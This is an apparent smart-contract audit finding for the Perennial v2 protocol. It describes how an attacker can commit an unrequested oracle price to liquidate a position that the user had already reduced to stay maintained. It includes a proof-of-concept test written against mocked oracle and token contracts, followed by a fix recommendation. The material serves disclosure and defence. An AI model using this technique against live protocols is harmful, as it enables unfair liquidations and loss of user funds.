Calm Gingham Beaver

medium

# Positions can be liquidated without ever having been unmaintained

## Summary

If a user updates their position to reduce leverage in expectation of it falling below maintenance due to an upcoming price change, normally the system should simply process that update at the next version change, preventing the user from being liquidated. However, it's possible for an attacker to commit an unrequested price update, effectively marking the position as being in an unmaintained state and allowing it to be liquidated regardless of the users prior update to hold maintenance.

## Vulnerability Detail

This vulnerability is possible due to a similar issue noted in https://gist.github.com/panprog/9ddcffda0b6449b92577010ca6c4b262, although this vulnerability remains regardless of the recommendation of the previously disclosed finding.

The problem lies in the fact that when an unrequested version is committed during the same requested version as a position change, regardless of the price change, the pending position isn't settled until the next requested version. As a result, even though the position was never in an unmaintained state, an attacker can simply commit an unrequested price and liquidate the position given that it's unmaintained with the new, unrequested, price.

## Impact

Users can be liquidated without their position ever being unmaintained.

## Code Snippet

Proof of Concept:

```solidity
it('liquidate maintained position', async () => {
  const positionMaker = parse6decimal('20.000')
  const positionLong = parse6decimal('10.000')
  const collateral = parse6decimal('1000')
  const collateral2 = parse6decimal('350')
  const maxPosition = parse6decimal('4611686018427') // 2^62-1
  
  const oracleVersion = {
      price: parse6decimal('100'),
      timestamp: TIMESTAMP,
      valid: true,
  }
  oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)
  oracle.status.returns([oracleVersion, TIMESTAMP + 100])
  oracle.request.returns()
  
  // maker
  dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)
  await market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false)
  
  // user opens long=10
  dsu.transferFrom.whenCalledWith(user.address, market.address, collateral2.mul(1e12)).returns(true)
  await market.connect(user).update(user.address, 0, positionLong, 0, collateral2, false)
  
  const oracleVersion2 = {
      price: parse6decimal('100'),
      timestamp: TIMESTAMP + 100,
      valid: true,
  }
  oracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2)
  oracle.status.returns([oracleVersion2, TIMESTAMP + 200])
  oracle.request.returns()
  
  // price moves against user, so he's at the edge of liquidation and tries to close
  // position: latest=10, pending [t=200] = 0 (closable = 0)
  await market.connect(user).update(user.address, 0, 0, 0, 0, false)
  
  const oracleVersion3 = {
      price: parse6decimal('92'),
      timestamp: TIMESTAMP + 190,
      valid: true,
  }
  oracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3)
  oracle.status.returns([oracleVersion3, TIMESTAMP + 300])
  oracle.request.returns()
  
  var loc = await market.locals(user.address);
  var posLatest = await market.positions(user.address);
  var posCurrent = await market.pendingPositions(user.address, loc.currentId);
  console.log("Before liquidation. Latest= " + posLatest.long + " current = " + posCurrent.long);
  
  // t = 205: price drops to 92, user becomes liquidatable before the pending position oracle version is commited
  // liquidator commits unrequested price = 92 at oracle version=190
  // User pending positions:
  //   latest = 10
  //   pending [t=200] = 0
  //   current(liquidated) = 0
  await market.connect(user).update(user.address, 0, 0, 0, 0, true)
  
  var loc = await market.locals(user.address);
  var posLatest = await market.positions(user.address);
  var posCurrent = await market.pendingPositions(user.address, loc.currentId);
  console.log("After liquidation. Latest= " + posLatest.long + " current = " + posCurrent.long);
})
```

https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L165

## Tool used

Manual Review

## Recommendation

Unrequested version commitments introduce a lot of unexpected effects. Ultimately I see it as more of a hindrance than a feature, so I think consideration should be put in to the idea of removing it entirely. If not removed, it'll be necessary to make sure pending positions are synced to unrequested version commitments, even before the next requested commitment is processed.